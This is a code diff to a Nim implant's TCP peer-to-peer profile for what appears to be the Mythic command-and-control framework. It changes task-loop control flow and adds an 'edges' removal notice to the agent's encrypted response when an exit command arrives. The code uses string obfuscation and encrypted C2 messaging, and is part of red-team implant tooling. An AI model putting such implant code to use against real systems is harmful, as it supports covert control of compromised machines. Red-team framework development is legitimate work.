@@ -689,6 +689,7 @@ proc start*(profile: TcpProfile) {.async.} =
                         else:
                           debug "[DEBUG] TCP P2P: No background task state for ", taskId
                         
+                        continue
                       
                       # Parse parameters - Mythic sends it as a JSON string
                       var params = newJObject()
@@ -820,11 +821,22 @@ proc start*(profile: TcpProfile) {.async.} =
                     taskingResponse[obf("delegates")] = taskDelegates
                     debug "[DEBUG] TCP P2P: Including ", taskDelegates.len, " downstream delegate(s) with task response"
                   
+                  # If exit command was received, include edge removal in the response
+                  if shouldExit:
+                    debug "[DEBUG] TCP P2P: Including edge removal notification in response"
+                    taskingResponse[obf("edges")] = %* [
+                      %* {
+                        obf("source"): "",
+                        obf("destination"): profile.callbackUuid,
+                        obf("action"): obf("remove"),
+                        obf("c2_profile"): "tcp"
+                      }
+                    ]
+                  
                   debug "[DEBUG] TCP P2P: Sending ", taskResponses.len, " task response(s)"
                   let responseEncrypted = profile.encryptMessage($taskingResponse, profile.callbackUuid)
                   await sendChunkedMessage(client, responseEncrypted)
                   
-                  # If exit command was received, wait briefly for message to be received then exit
                   if shouldExit:
                     debug "[DEBUG] TCP P2P: Exit command sent, waiting 500ms for delivery before shutdown"
                     await sleepAsync(500)  # Give time for message to be received and processed
